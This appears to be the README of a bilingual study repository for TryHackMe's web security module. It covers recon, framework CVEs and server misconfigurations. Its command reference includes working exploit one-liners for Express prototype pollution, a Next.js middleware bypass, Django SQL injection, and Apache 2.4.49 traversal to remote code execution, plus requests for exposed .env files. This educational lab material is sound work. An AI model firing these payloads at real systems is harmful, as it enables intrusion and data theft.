# 🛡️ Web Application Security Fundamentals — Master Engineering & Pentest Guide

[![Platform: TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red.svg?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/)
[![Module: Web Security](https://img.shields.io/badge/Module-Web%20App%20Security%20Fundamentals-blue.svg?style=for-the-badge)](https://tryhackme.com/module/web-application-security-fundamentals)
[![Language: Bilingual](https://img.shields.io/badge/Language-English%20%7C%20العربية-success.svg?style=for-the-badge)](#-bilingual-structure)
[![Documentation: Markdown](https://img.shields.io/badge/Format-100%25%20Markdown-orange.svg?style=for-the-badge&logo=markdown)](https://www.markdownguide.org/)

> **Language Switcher:** [🇸🇦 اضغط هنا للانتقال إلى النسخة العربية الكاملة للمستودع](./README.ar.md)

---

## 📖 About This Repository

This repository is an **industry-grade, methodology-first study and reference suite** covering the four foundational rooms of TryHackMe's **Web Application Security Fundamentals** module.

Unlike typical CTF write-ups that simply dump transient flag strings, this repository breaks down:
1. **The Core Security Concepts & Mental Models** behind each challenge.
2. **Signal-to-Exploit Reasoning:** How to spot passive signals in headers, DOM trees, and network traffic before firing exploits.
3. **Task-by-Task Investigative Methodology:** Step-by-step guidance on how to extract evidence yourself on your active lab instance without spoiling the learning experience.
4. **Real-World Career & Industry Value:** How each room maps to commercial penetration testing engagements, bug bounty programs ($5,000–$35,000+ payouts), professional client report templates, and AppSec technical interview questions.

---

## 🗂️ Repository Structure

Every room is organized into its own self-contained directory containing **complete bilingual documentation (English & Arabic)** and **dedicated Real-World Impact guides**:

```
Web-Application-Security-Fundamentals/
│
├── 📂 01-walking-an-application/
│   ├── 📄 README.md                   # Bilingual Room Portal
│   ├── 📂 ar/                         # Arabic Documentation
│   │   ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالعربية
│   │   └── 📄 real-world-impact.md    # تطبيقات سوق العمل ونماذج التقارير والترقيع
│   └── 📂 en/                         # English Documentation
│       ├── 📄 README.md               # English Walkthrough & Task Methodology
│       └── 📄 real-world-impact.md    # Pentest Value, Bug Bounty & Career Guide
│
├── 📂 02-content-discovery/
│   ├── 📄 README.md                   # Bilingual Room Portal
│   ├── 📂 ar/                         # Arabic Documentation
│   │   ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالعربية
│   │   └── 📄 real-world-impact.md    # مسارات الاستطلاع، إدارة مساحة الهجوم، وسوق العمل
│   └── 📂 en/                         # English Documentation
│       ├── 📄 README.md               # English Walkthrough & Task Methodology
│       └── 📄 real-world-impact.md    # Recon Pipelines, Attack Surface & Bug Bounty
│
├── 📂 03-modern-web-stacks/
│   ├── 📄 README.md                   # Bilingual Room Portal
│   ├── 📂 ar/                         # Arabic Documentation
│   │   ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالعربية
│   │   └── 📄 real-world-impact.md    # ثغرات الأطر الحديثة، سلاسل الاستغلال، والترقيع
│   └── 📂 en/                         # English Documentation
│       ├── 📄 README.md               # English Walkthrough & Task Methodology
│       └── 📄 real-world-impact.md    # Framework CVEs, Exploit Chains & Architecture
│
├── 📂 04-web-server-attacks-i/
│   ├── 📄 README.md                   # Bilingual Room Portal
│   ├── 📂 ar/                         # Arabic Documentation
│   │   ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالعربية
│   │   └── 📄 real-world-impact.md    # أخطاء الإعداد الأمني، أدلة التأمين، والمقابلات
│   └── 📂 en/                         # English Documentation
│       ├── 📄 README.md               # English Walkthrough & Task Methodology
│       └── 📄 real-world-impact.md    # Misconfigurations, Hardening & CIS Benchmarks
│
├── 📂 cheatsheets/
│   ├── 📄 README.md                   # Master Cheat Sheet & 15-Point Skills Checklist (EN)
│   └── 📄 README.ar.md                # الملخص النهائي السريع وقائمة مراجعة المهارات (AR)
│
├── 📂 docs/
│   └── 📄 Web-Application-Security-Fundamentals-Arabic-Guide.pdf # Original Full PDF
├── 📄 .gitignore                      # Git Ignore Configuration
├── 📄 LICENSE                         # MIT Open-Source License
├── 📄 README.md                       # Master English Repository Guide (You are here)
└── 📄 README.ar.md                    # الدليل الرئيسي الشامل للمستودع بالعربية
```

---

## 🗺️ Module Architecture & Room Index

| Room # | Room Title | Focus Area | English Guide | Arabic Guide | Real-World Value |
|:---:|---|---|:---:|:---:|:---:|
| **01** | **Walking An Application** | Browser DevTools as an offensive toolkit, live DOM inspection, JavaScript breakpoints, background API observation, and cookie security flags. | [Read EN](./01-walking-an-application/en/README.md) | [اقرأ عربي](./01-walking-an-application/ar/README.md) | [EN](./01-walking-an-application/en/real-world-impact.md) \| [AR](./01-walking-an-application/ar/real-world-impact.md) |
| **02** | **Content Discovery** | Tri-layer reconnaissance: Manual (`robots.txt`, `sitemap.xml`, headers), OSINT (Google Dorking, GitHub commits, S3 buckets), and Automated Gobuster (`dir`, `dns`, `vhost`). | [Read EN](./02-content-discovery/en/README.md) | [اقرأ عربي](./02-content-discovery/ar/README.md) | [EN](./02-content-discovery/en/real-world-impact.md) \| [AR](./02-content-discovery/ar/real-world-impact.md) |
| **03** | **Modern Web Stacks** | Passive stack fingerprinting followed by deep CVE exploitation: Prototype Pollution (Express), Next.js Middleware Bypass, Django ORM SQLi, and Apache 2.4.49 Traversal to RCE. | [Read EN](./03-modern-web-stacks/en/README.md) | [اقرأ عربي](./03-modern-web-stacks/ar/README.md) | [EN](./03-modern-web-stacks/en/real-world-impact.md) \| [AR](./03-modern-web-stacks/ar/real-world-impact.md) |
| **04** | **Web Server Attacks - I** | Cross-server misconfiguration auditing across Linux hosts: Apache2 (`mod_status`, directory indexing), Python HTTP Server (zero auth), Node.js Express (dev mode leaks), and Nginx (`stub_status`, `autoindex`). | [Read EN](./04-web-server-attacks-i/en/README.md) | [اقرأ عربي](./04-web-server-attacks-i/ar/README.md) | [EN](./04-web-server-attacks-i/en/real-world-impact.md) \| [AR](./04-web-server-attacks-i/ar/real-world-impact.md) |

---

## 🧬 Featured CVE Matrix (Room 3)

| Target Stack | CVE Identifier | CVSS v3.1 | Attack Vector | Real-World Impact |
|---|---|---|---|---|
| **MERN / Express** | [CVE-2020-8203](https://nvd.nist.gov/vuln/detail/CVE-2020-8203) | **7.4 High** | Prototype Pollution via unvalidated recursive object merge | Privilege escalation to administrative role (`isAdmin: true`) |
| **Next.js App Router** | [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927) | **9.1 Critical** | Spoofed internal `x-middleware-subrequest` HTTP header | Complete bypass of centralized authentication & authorization |
| **Django ORM** | [CVE-2021-35042](https://nvd.nist.gov/vuln/detail/CVE-2021-35042) | **9.8 Critical** | Raw string concatenation inside `order_by()` clause | Error-based arbitrary data extraction via MySQL `updatexml()` |
| **Apache LAMP** | [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773) | **9.8 Critical** | Decode-order flaw in `ap_normalize_path()` + `mod_cgi` | Unauthenticated Arbitrary File Read and Remote Code Execution (RCE) |

---

## ⚡ Master Terminal Command Reference

```bash
# ================================================================
# 1. CONTENT DISCOVERY & RECONNAISSANCE (Room 2)
# ================================================================
# Inspect crawler boundaries and framework headers
curl -s http://MACHINE_IP/robots.txt
curl -s http://MACHINE_IP/sitemap.xml
curl -sI http://MACHINE_IP/

# Automated directory and file brute-forcing
gobuster dir -u http://MACHINE_IP/ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -x txt,php,html,bak,log -t 20

# DNS subdomain enumeration (handles wildcard records)
gobuster dns -d example.thm \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --wildcard

# Virtual host enumeration (routes via Host: header directly to IP)
gobuster vhost -u http://MACHINE_IP/ \
  --domain example.thm \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain --exclude-length 250-320

# ================================================================
# 2. MODERN STACK EXPLOITATION CHAINS (Room 3)
# ================================================================
# Express: Prototype Pollution payload to elevate privileges
curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

# Next.js: Header-based middleware authentication bypass
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://MACHINE_IP:3001/dashboard

# Django: Error-based SQLi extracting database name via XPath syntax error
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(SELECT%20database())),1)" \
  | grep -o '~[0-9a-zA-Z_][^&]*'

# Apache 2.4.49: Path Traversal to CGI Remote Code Execution (--path-as-is required!)
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id; cat /flag.txt'

# ================================================================
# 3. WEB SERVER MISCONFIGURATION AUDITING (Room 4)
# ================================================================
# Audit security headers across all target services
for port in 80 8000 3000 8080; do
  echo "=== PORT $port ==="
  curl -sI http://MACHINE_IP:$port/ | grep -iE "x-frame|x-content-type|content-security|strict-transport|referrer" || echo "[-] No headers!"
done

# Check exposed diagnostic endpoints
curl -s http://MACHINE_IP:80/server-status       # Apache mod_status
curl -s http://MACHINE_IP:8080/nginx_status      # Nginx stub_status
curl -s http://MACHINE_IP:8000/.env             # Python HTTP server dotfile exposure
curl -s http://MACHINE_IP:3000/api/debug/env     # Express debug route
```

---

## 🎯 Skills & Competency Matrix

By completing and reviewing this repository, you develop verified competencies across:
- [x] **Client-Side Security:** Understanding DOM vs. Source, executing temporal breakpoints, auditing cookie flags (`HttpOnly`, `Secure`, `SameSite`).
- [x] **Attack Surface Management:** Mastering the DNS Subdomain vs. HTTP Virtual Host distinction.
- [x] **Framework Vulnerability Analysis:** Reverse engineering root causes of Prototype Pollution, Next.js internal subrequests, and unparameterized ORM clauses.
- [x] **Infrastructure Hardening:** Securing Linux web servers (Apache, Nginx, Express, Python) using CIS-aligned configuration directives.
- [x] **Professional Documentation:** Authoring production-ready pentest findings with CVSS v3.1 scoring, business impact analysis, and developer remediation code.

---

## 📜 License & Ethical Disclaimer

This material is provided strictly for educational and authorized penetration testing purposes. Practice techniques only on systems you own or have explicit, written permission to test (e.g., your own TryHackMe lab instances). Unauthorized access to computer systems is illegal.
